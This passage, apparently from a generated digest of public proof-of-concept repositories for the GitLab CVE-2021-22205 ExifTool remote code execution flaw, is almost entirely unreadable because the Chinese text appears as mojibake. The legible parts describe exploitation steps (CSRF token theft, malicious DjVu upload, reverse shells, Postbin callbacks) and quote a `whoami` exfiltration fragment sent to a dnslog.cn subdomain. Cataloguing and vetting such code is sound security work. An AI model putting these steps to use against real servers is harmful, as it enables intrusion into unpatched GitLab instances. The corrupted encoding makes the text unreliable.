**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…ï¼Œä¸”å¯ä»¥é€šè¿‡ç½‘ç»œè®¿é—®ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 5%

## è¯¦æƒ…

CVE-2021-22205 æ¼æ´žå­˜åœ¨äºŽ GitLab CE/EE ä¸­ï¼ŒæºäºŽå…¶æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ¼æ´žåˆ©ç”¨æ–¹å¼ï¼šæ”»å‡»è€…å¯ä»¥æž„é€ åŒ…å«æ¶æ„å…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶ï¼Œé€šè¿‡ä¸Šä¼ æŽ¥å£ï¼ˆå¦‚ç”¨æˆ·å¤´åƒä¸Šä¼ ï¼‰è§¦å‘ ExifTool çš„å‘½ä»¤æ³¨å…¥æ¼æ´žï¼Œä»Žè€Œæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æ¼æ´žåˆ©ç”¨æœ‰æ•ˆæ€§:**
æ ¹æ®æ¼æ´žåº“ä¿¡æ¯å’Œæ¼æ´žåˆ©ç”¨ä»£ç ï¼Œæä¾›çš„PoCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚æ¼æ´žåº“ä¿¡æ¯ä¸­çš„å‚è€ƒé“¾æŽ¥æŒ‡å‘äº† HackerOne æŠ¥å‘Šå’Œ Packet Storm Security çš„ç›¸å…³åˆ©ç”¨åˆ†æžï¼Œè¯æ˜Žäº†è¯¥æ¼æ´žçš„å¯åˆ©ç”¨æ€§ã€‚æä¾›çš„ bash è„šæœ¬èƒ½å¤Ÿè‡ªåŠ¨åŒ–åˆ©ç”¨è¯¥æ¼æ´žï¼Œæ”¯æŒåå¼¹ shell å’Œè‡ªå®šä¹‰å‘½ä»¤æ‰§è¡Œã€‚

**æŠ•æ¯’é£Žé™©åˆ†æž:**
æä¾›çš„ bash è„šæœ¬ `cve-2021-22205.sh`  ä¸»è¦åŠŸèƒ½æ˜¯ç”ŸæˆåŒ…å«æ¶æ„å…ƒæ•°æ®çš„å›¾åƒï¼Œå¹¶é€šè¿‡ curl å‘½ä»¤ä¸Šä¼ åˆ°ç›®æ ‡ GitLab æœåŠ¡å™¨ï¼Œè§¦å‘å‘½ä»¤æ‰§è¡Œã€‚ ä»£ç æœ¬èº«é€»è¾‘æ¸…æ™°ï¼Œæ²¡æœ‰æ˜Žæ˜¾çš„æ¶æ„è¡Œä¸ºï¼Œå¦‚æœªç»æŽˆæƒçš„æ–‡ä»¶è®¿é—®ã€æ•°æ®çªƒå–ã€æˆ–è€…æ¤å…¥åŽé—¨ç­‰ã€‚

è™½ç„¶ç›®å‰çš„ä»£ç æ²¡æœ‰å‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’è¿¹è±¡ï¼Œä½†æ˜¯ç”±äºŽè„šæœ¬ä¼šæ‰§è¡Œç”¨æˆ·æŒ‡å®šçš„å‘½ä»¤ï¼Œå› æ­¤å­˜åœ¨æ½œåœ¨é£Žé™©ã€‚ç”¨æˆ·éœ€è¦ä»”ç»†æ£€æŸ¥è¿è¡Œçš„å‘½ä»¤ï¼Œé¿å…æ‰§è¡Œæ¶æ„æ“ä½œã€‚æ½œåœ¨çš„æŠ•æ¯’æ–¹å¼å¯èƒ½æ˜¯åœ¨è„šæœ¬ä¸­æ·»åŠ éšè”½çš„é€»è¾‘ï¼Œä¾‹å¦‚æ ¹æ®ç›®æ ‡çŽ¯å¢ƒæ‰§è¡Œä¸åŒçš„å‘½ä»¤ã€‚å› æ­¤ï¼Œä»£ç çš„å®‰å…¨æ€§è¯„ä¼°å¹¶éžç»å¯¹ï¼Œéœ€è¦ç»“åˆå…·ä½“ä½¿ç”¨åœºæ™¯è¿›è¡Œç»¼åˆåˆ¤æ–­ã€‚ ä»£ç ä¸­åˆ›å»ºä¸´æ—¶æ–‡ä»¶, å¹¶ä¸”è¿›è¡Œåˆ é™¤å¯ä»¥åˆ¤å®š,ä½œè€…çš„ç¼–ç ä¹ æƒ¯è‰¯å¥½.

**æ¼æ´žåˆ©ç”¨æ–¹å¼:**
1.  æ”»å‡»è€…é¦–å…ˆèŽ·å–ç›®æ ‡ GitLab å®žä¾‹çš„ CSRF Token å’Œ Session Cookieã€‚
2.  ç„¶åŽï¼Œæž„é€ ä¸€ä¸ªåŒ…å«æ¶æ„å…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶ï¼Œè¯¥å…ƒæ•°æ®ä¸­åŒ…å«äº†è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚
3.  ä½¿ç”¨ curl å‘½ä»¤ï¼Œå°†æž„é€ çš„æ¶æ„å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ° GitLab æœåŠ¡å™¨çš„å¤´åƒä¸Šä¼ æŽ¥å£ã€‚
4.  GitLab è°ƒç”¨ ExifTool å¤„ç†ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶ï¼ŒExifTool åœ¨è§£æžå›¾åƒå…ƒæ•°æ®æ—¶ï¼Œä¼šæ‰§è¡Œæ¶æ„å‘½ä»¤ï¼Œä»Žè€Œå®žçŽ°è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚
5. æ”»å‡»è€…å¯ä»¥é€šè¿‡åå¼¹ shell æˆ–è€…æ‰§è¡Œè‡ªå®šä¹‰å‘½ä»¤æ¥æŽ§åˆ¶æœåŠ¡å™¨ã€‚

**é¡¹ç›®åœ°å€:** [NukingDragons/gitlab-cve-2021-22205](https://github.com/NukingDragons/gitlab-cve-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #5

**æ¥æº**: [CVE-2021-22205-ZZ-SOCMAP_CVE-2021-22205.md](../2021/CVE-2021-22205-ZZ-SOCMAP_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** ä¸¥é‡ï¼Œå¯èƒ½å¯¼è‡´å®Œå…¨æŽ§åˆ¶GitLabæœåŠ¡å™¨

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** æ— éœ€èº«ä»½éªŒè¯ï¼Œåªéœ€ç½‘ç»œè®¿é—®å³å¯

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 10%

## è¯¦æƒ…

CVE-2021-22205 æ˜¯ä¸€ä¸ªå­˜åœ¨äºŽ GitLab CE/EE ä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæºäºŽ GitLab æœªèƒ½æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ”»å‡»è€…å¯ä»¥ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼ˆä¾‹å¦‚ï¼ŒåŒ…å«æ¶æ„ ExifTool å…ƒæ•°æ®çš„ DJVU æ–‡ä»¶ï¼‰ï¼Œå½“ GitLab å°è¯•å¤„ç†è¯¥æ–‡ä»¶æ—¶ï¼ŒExifTool ä¼šæ‰§è¡ŒåµŒå…¥çš„æ¶æ„å‘½ä»¤ã€‚ 

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç æ˜¯æœ‰æ•ˆçš„ï¼Œå› ä¸ºå®ƒå®žçŽ°äº†æ¼æ´žåˆ©ç”¨æ‰€éœ€çš„æ­¥éª¤ï¼š

1.  æž„é€ åŒ…å«æ¶æ„å…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶ï¼ˆDJVU æ ¼å¼ï¼‰ã€‚ å…ƒæ•°æ®ä¸­åµŒå…¥äº†æ‰§è¡Œå‘½ä»¤çš„ payloadã€‚ å…·ä½“çš„payloadåœ¨ `rce_payload` å‡½æ•°ä¸­æž„é€ , ä½¿ç”¨äº† `qx{}` åŒ…è£¹å‘½ä»¤ã€‚
2.  åˆ›å»ºé¡¹ç›®ï¼ŒèŽ·å–`csrf_token`ï¼Œå’Œ`_gitlab_session`ã€‚
3.  ä¸Šä¼ æ¶æ„å›¾åƒæ–‡ä»¶åˆ°æ–°é¡¹ç›®çš„snippetï¼Œè§¦å‘æ¼æ´žã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
POCä»£ç å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£Žé™©ï¼Œå¤§çº¦ä¸º10%ã€‚è™½ç„¶ä¸»è¦ç›®çš„æ˜¯åˆ©ç”¨æ¼æ´žï¼Œä½†éœ€è¦æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š

*   **dnslog.cn:** ä»£ç ä¸­ä½¿ç”¨ `whoami`.q3ddlk.dnslog.cn åŸŸåè¿›è¡Œå‘½ä»¤æ‰§è¡Œç»“æžœçš„å›žä¼ ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¿®æ”¹è¯¥åŸŸåæ¥æ”¶é›†å—å®³è€…çš„ä¿¡æ¯ï¼Œä»Žè€Œè¿›è¡Œè¿›ä¸€æ­¥çš„æ”»å‡»ã€‚è™½ç„¶åœ¨æµ‹è¯•ä¸­è¿™æ–¹ä¾¿äº†æ¼æ´žéªŒè¯ï¼Œä½†åœ¨å®žé™…æ”»å‡»ä¸­ï¼Œæ¶æ„åŸŸåå¯èƒ½è¢«ç”¨äºŽæ›´éšè”½çš„ç›®çš„ï¼Œå¦‚C2é€šä¿¡ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
åˆ©ç”¨æ–¹å¼å¯ä»¥æ€»ç»“å¦‚ä¸‹ï¼š

1.  **æ¼æ´žå‘çŽ°ï¼š** GitLab æœªæ­£ç¡®éªŒè¯ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´ ExifTool åœ¨å¤„ç†å›¾åƒæ—¶æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚
2.  **Payload æž„é€ ï¼š** æ”»å‡»è€…æž„é€ åŒ…å«æ¶æ„ ExifTool å…ƒæ•°æ®çš„ DJVU å›¾åƒæ–‡ä»¶ã€‚è¯¥å…ƒæ•°æ®åŒ…å«è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚
3.  **æ–‡ä»¶ä¸Šä¼ ï¼š** æ”»å‡»è€…ä¸Šä¼ æ¶æ„å›¾åƒæ–‡ä»¶åˆ° GitLabï¼Œé€šå¸¸æ˜¯é€šè¿‡é¡¹ç›®åˆ›å»ºï¼Œæˆ–è€…ä¸Šä¼ åˆ° Issue æˆ– Merge Request ä¸­ã€‚
4.  **å‘½ä»¤æ‰§è¡Œï¼š** å½“ GitLab å°è¯•å¤„ç†ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶æ—¶ï¼ŒExifTool æ‰§è¡ŒåµŒå…¥çš„å‘½ä»¤ã€‚åˆ©ç”¨ä»£ç åˆ›å»ºé¡¹ç›®ï¼Œå¹¶èŽ·å–åˆ›å»ºsnippetçš„tokenï¼Œæœ€åŽä¸Šä¼ æ–‡ä»¶è§¦å‘ã€‚
5.  **RCEï¼š** æˆåŠŸåˆ©ç”¨è¯¥æ¼æ´žï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ GitLab æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œä»Žè€Œå®žçŽ°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [ZZ-SOCMAP/CVE-2021-22205](https://github.com/ZZ-SOCMAP/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #6

**æ¥æº**: [CVE-2021-22205-c0okB_CVE-2021-22205.md](../2021/CVE-2021-22205-c0okB_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8, >=13.9, <13.9.6, >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹å­˜åœ¨æ¼æ´žä¸”å¯ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205 æ˜¯ä¸€ä¸ª GitLab CE/EE ä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæºäºŽ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§:**
æ ¹æ®æ¼æ´žåº“ä¿¡æ¯å’Œæä¾›çš„æ¼æ´žåˆ©ç”¨ä»£ç ï¼Œæ­¤æ¼æ´žPOCæœ‰æ•ˆã€‚æ¼æ´žåº“ä¸­CVSSè¯„åˆ†ä¸º10ï¼Œå±žäºŽä¸¥é‡æ¼æ´žï¼ŒCISA KEVä¸­ä¹Ÿæ ‡è®°ä¸ºå·²çŸ¥è¢«åˆ©ç”¨æ¼æ´žï¼Œç»“åˆæä¾›çš„ä»£ç ï¼Œè¯æ˜Žè¯¥æ¼æ´žå­˜åœ¨ä¸”å®¹æ˜“è¢«åˆ©ç”¨ã€‚

**æŠ•æ¯’é£Žé™©:**
åˆ†æžæä¾›çš„POCä»£ç ï¼Œè¯¥ä»£ç ä¸»è¦å®žçŽ°äº†ä»¥ä¸‹åŠŸèƒ½ï¼š

*   DNSLog æŽ¢æµ‹ï¼šé€šè¿‡ DNSLog éªŒè¯æ¼æ´žæ˜¯å¦å­˜åœ¨ã€‚
*   RCEï¼šåˆ©ç”¨ Postbin è¿›è¡Œå¸¦å¤–å‘½ä»¤æ‰§è¡Œã€‚
*   åå¼¹ Shellï¼šåå¼¹ shell åˆ°æŒ‡å®šçš„ host å’Œ portã€‚
*   ä¸Šä¼ æ–‡ä»¶ï¼šé€šè¿‡ http åè®®ä¸Šä¼ æ–‡ä»¶åˆ°ç›®æ ‡æœåŠ¡å™¨ï¼ˆéœ€è¦ VPSï¼‰ã€‚

ä»£ç ä¸»è¦é›†ä¸­åœ¨æ¼æ´žåˆ©ç”¨ï¼Œæ²¡æœ‰å‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’è¡Œä¸ºã€‚è¯¥å·¥å…·éœ€è¦ä½¿ç”¨è€…æä¾›ç›®æ ‡URLå’Œå‘½ä»¤ï¼Œæˆ–è€…åå¼¹shellåœ°å€ï¼Œæ²¡æœ‰å‘çŽ°ä½œè€…é¢„ç•™åŽé—¨çš„è¿¹è±¡ã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£Žé™©è¾ƒä½Žï¼Œè¯„ä¼°ä¸º0%ã€‚

**åˆ©ç”¨æ–¹å¼:**

1.  **æ¼æ´žæ£€æµ‹:**  ä½¿ç”¨ `-m detect`  é€‰é¡¹ï¼Œé€šè¿‡ DNSLog éªŒè¯ç›®æ ‡æ˜¯å¦å­˜åœ¨æ¼æ´žã€‚ç¨‹åºä¼šç”Ÿæˆä¸€ä¸ªåŒ…å« DNS æŸ¥è¯¢è¯·æ±‚çš„æ–‡ä»¶ï¼Œå¦‚æžœç›®æ ‡å­˜åœ¨æ¼æ´žï¼Œä¼šå‘æŒ‡å®šçš„ DNSLog æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œä»Žè€ŒéªŒè¯æ¼æ´žã€‚
2.  **å‘½ä»¤æ‰§è¡Œ:**
    *   ä½¿ç”¨ `-m rce1` é€‰é¡¹ï¼Œé€šè¿‡ Postbin æ‰§è¡Œå‘½ä»¤ã€‚ç¨‹åºæž„é€ ä¸€ä¸ªåŒ…å«å‘½ä»¤çš„æ–‡ä»¶ï¼Œå¹¶å°†å…¶ä¸Šä¼ åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚ç›®æ ‡æœåŠ¡å™¨åœ¨è§£æžè¯¥æ–‡ä»¶æ—¶ï¼Œä¼šè§¦å‘æ¼æ´žå¹¶æ‰§è¡Œå‘½ä»¤ï¼Œå¹¶å°†ç»“æžœå‘é€åˆ° Postbinã€‚
3.  **åå¼¹ Shell:** ä½¿ç”¨ `-m rev` é€‰é¡¹ï¼Œåå¼¹ shell åˆ°æŒ‡å®šçš„ host å’Œ portã€‚ç¨‹åºæž„é€ ä¸€ä¸ªåŒ…å«åå¼¹ shell å‘½ä»¤çš„æ–‡ä»¶ï¼Œå¹¶å°†å…¶ä¸Šä¼ åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚ç›®æ ‡æœåŠ¡å™¨åœ¨è§£æžè¯¥æ–‡ä»¶æ—¶ï¼Œä¼šè§¦å‘æ¼æ´žå¹¶æ‰§è¡Œåå¼¹ shell å‘½ä»¤ï¼Œä»Žè€Œå»ºç«‹ä¸Žæ”»å‡»è€…æœåŠ¡å™¨çš„è¿žæŽ¥ã€‚
4.  **æ–‡ä»¶ä¸Šä¼ :** ä½¿ç”¨ `-m upload` é€‰é¡¹ï¼Œä¸Šä¼ æ–‡ä»¶åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚ç¨‹åºæž„é€ ä¸€ä¸ªåŒ…å«è¦ä¸Šä¼ çš„æ–‡ä»¶çš„æ–‡ä»¶ï¼Œå¹¶å°†å…¶ä¸Šä¼ åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚ç›®æ ‡æœåŠ¡å™¨åœ¨è§£æžè¯¥æ–‡ä»¶æ—¶ï¼Œä¼šè§¦å‘æ¼æ´žå¹¶å°†æ–‡ä»¶ä¿å­˜åˆ°æŒ‡å®šä½ç½®ã€‚

æ­¤æ¼æ´žåˆ©ç”¨çš„å…³é”®åœ¨äºŽåˆ©ç”¨ExifToolå¤„ç†å›¾ç‰‡æ—¶ï¼Œç”±äºŽæœªå¯¹ä¼ å…¥å‚æ•°è¿›è¡Œä¸¥æ ¼è¿‡æ»¤ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡æž„é€ æ¶æ„å›¾ç‰‡ï¼Œåœ¨ExifToolæ‰§è¡Œè¿‡ç¨‹ä¸­æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚


**é¡¹ç›®åœ°å€:** [c0okB/CVE-2021-22205](https://github.com/c0okB/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #7

**æ¥æº**: [CVE-2021-22205-cc3305_CVE-2021-22205.md](../2021/CVE-2021-22205-cc3305_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** ä¸¥é‡ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…ï¼Œä¸”æ”»å‡»è€…å¯è®¿é—®è¯¥å®žä¾‹ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 10%

## è¯¦æƒ…

CVE-2021-22205 æ˜¯ä¸€ä¸ªå­˜åœ¨äºŽ GitLab CE/EE ä¸­çš„è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæ˜¯ç”±äºŽ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶å¯¼è‡´çš„ã€‚å…·ä½“æ¥è¯´ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼ˆDjVu æ–‡ä»¶ï¼‰åˆ° GitLab æœåŠ¡å™¨ï¼Œå…¶ä¸­å›¾åƒæ–‡ä»¶çš„å…ƒæ•°æ®ä¸­åŒ…å«æ¶æ„å‘½ä»¤ã€‚å½“ GitLab ä½¿ç”¨ ExifTool å¤„ç†è¯¥å›¾åƒæ—¶ï¼Œæ–‡ä»¶ä¸­çš„æ¶æ„å‘½ä»¤ä¼šè¢«æ‰§è¡Œï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§ï¼š**
æ ¹æ®æä¾›çš„æ¼æ´žåº“ä¿¡æ¯å’Œæ¼æ´žåˆ©ç”¨ä»£ç ï¼Œè¯¥æ¼æ´žçš„POCä»£ç æœ‰æ•ˆã€‚æ¼æ´žåº“ä¿¡æ¯è¡¨æ˜Žè¯¥æ¼æ´žçš„ä¸¥é‡æ€§ä¸ºâ€œä¸¥é‡ (CRITICAL)â€ï¼ŒCVSS è¯„åˆ†é«˜è¾¾ 10 åˆ†ï¼Œè¡¨æ˜Žè¯¥æ¼æ´žå½±å“èŒƒå›´å¹¿ä¸”å®¹æ˜“åˆ©ç”¨ã€‚æä¾›çš„ POC ä»£ç  `CVE-2021-22205.py` æ—¨åœ¨åˆ©ç”¨æ­¤æ¼æ´žã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  **æŸ¥æ‰¾CSRF token:** è„šæœ¬é¦–å…ˆå°è¯•ä»Ž `/users/sign_in` é¡µé¢èŽ·å– CSRF tokenï¼Œå› ä¸ºä¸Šä¼ æ–‡ä»¶éœ€è¦æœ‰æ•ˆçš„ CSRF tokenã€‚å®ƒä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æ¥æå– tokenã€‚
2.  **æž„å»ºæ¶æ„DjVuæ–‡ä»¶ä¸Šä¼ è¯·æ±‚:** ç„¶åŽï¼Œè„šæœ¬æž„å»ºä¸€ä¸ªåŒ…å«æ¶æ„ ExifTool å‘½ä»¤çš„ DjVu æ–‡ä»¶ã€‚è¿™ä¸ªæ–‡ä»¶ä¼šè¢«ä¸Šä¼ åˆ° GitLab æœåŠ¡å™¨ï¼ŒGitLab æœåŠ¡å™¨ä¼šä½¿ç”¨ ExifTool å¤„ç†è¯¥æ–‡ä»¶ã€‚
3.  **è§¦å‘å‘½ä»¤æ‰§è¡Œ:** å½“ ExifTool å¤„ç†è¯¥æ¶æ„æ–‡ä»¶æ—¶ï¼ŒåµŒå…¥åœ¨æ–‡ä»¶å…ƒæ•°æ®ä¸­çš„å‘½ä»¤å°±ä¼šè¢«æ‰§è¡Œï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
è™½ç„¶æä¾›çš„ä»£ç çœ‹èµ·æ¥åŠŸèƒ½æ˜Žç¡®ï¼Œä½†å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£Žé™©ã€‚å…·ä½“è¡¨çŽ°åœ¨ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

*   **ä¾èµ–æ€§é£Žé™©:** è¯¥è„šæœ¬ä¾èµ–äºŽ `requests` æ¨¡å—ã€‚è™½ç„¶è¿™æ˜¯å¾ˆå¸¸è§çš„æ¨¡å—ï¼Œå¦‚æžœä½œè€…ä¿®æ”¹äº†ä»£ç ä¸­çš„å…¶ä»–åœ°æ–¹ï¼Œä½¿å…¶å®‰è£…äº†æ¶æ„ä¾èµ–ï¼Œè¿™å¯èƒ½æ˜¯ä¸€ä¸ªæŠ•æ¯’ç‚¹ã€‚
*   **ä»£ç†é…ç½®åˆ©ç”¨:** è„šæœ¬æ”¯æŒé€šè¿‡ä»£ç†æœåŠ¡å™¨è¿žæŽ¥ã€‚æ”»å‡»è€…å¯èƒ½ä¼šé€šè¿‡æä¾›æ¶æ„çš„ä»£ç†æœåŠ¡å™¨åœ°å€æ¥çªƒå–å—å®³è€…çš„å‡­æ®æˆ–æ‰§è¡Œä¸­é—´äººæ”»å‡»ã€‚
*   **å‘½ä»¤æ‰§è¡Œçš„éšè”½æ€§ï¼š** å¦‚æžœä¸Šä¼ çš„payloadåŒ…å«åå¼¹shell, åˆ™è„šæœ¬å¯èƒ½ä¼šå°è¯•å»ºç«‹åå‘ shell è¿žæŽ¥æˆ–æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œè€Œéš¾ä»¥æ£€æµ‹ã€‚
*   **ç‰ˆæœ¬éªŒè¯ç»•è¿‡:** è„šæœ¬ä¸­çš„ç‰ˆæœ¬éªŒè¯å¯èƒ½å­˜åœ¨ç»•è¿‡çš„é£Žé™©ï¼Œå³ä½¿ç”¨æˆ·ä¿®å¤äº†æ¼æ´žï¼Œè„šæœ¬ä»ç„¶å°è¯•åˆ©ç”¨ï¼Œå¯èƒ½ä¼šå¯¼è‡´å…¶ä»–æœªçŸ¥çš„å®‰å…¨é—®é¢˜ã€‚

ç»¼åˆè€ƒè™‘ï¼Œè¯„ä¼°æŠ•æ¯’é£Žé™©çº¦ä¸º 10%ã€‚ä¸»è¦åŽŸå› æ˜¯è¯¥è„šæœ¬çš„åŠŸèƒ½è¾ƒä¸ºé›†ä¸­ï¼Œä¸”ä¾èµ–æ¨¡å—è¾ƒå°‘ã€‚ä½†ä»ç„¶éœ€è¦å¯¹è„šæœ¬è¿›è¡Œä»”ç»†å®¡æŸ¥ï¼Œä»¥ç¡®ä¿å…¶å®‰å…¨æ€§ã€‚

**é¡¹ç›®åœ°å€:** [cc3305/CVE-2021-22205](https://github.com/cc3305/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #8

**æ¥æº**: [CVE-2021-22205-ccordeiro_CVE-2021-22205.md](../2021/CVE-2021-22205-ccordeiro_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´å®Œå…¨æŽ§åˆ¶æœåŠ¡å™¨

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹å¯ä»Žç½‘ç»œè®¿é—®ï¼Œä¸”æœªæ‰“è¡¥ä¸

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 1%

## è¯¦æƒ…

CVE-2021-22205 å­˜åœ¨äºŽ GitLab CE/EE ä¸­ï¼Œå½±å“ä»Ž 11.9 å¼€å§‹çš„æ‰€æœ‰ç‰ˆæœ¬ã€‚GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«æ¶æ„ ExifTool å…ƒæ•°æ®ï¼Œæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æ¼æ´žåˆ©ç”¨æ–¹å¼:**
1.  æ”»å‡»è€…é¦–å…ˆè®¿é—®GitLabå®žä¾‹çš„ç™»å½•é¡µé¢ `/users/sign_in`ï¼ŒèŽ·å– CSRF tokenã€‚ 
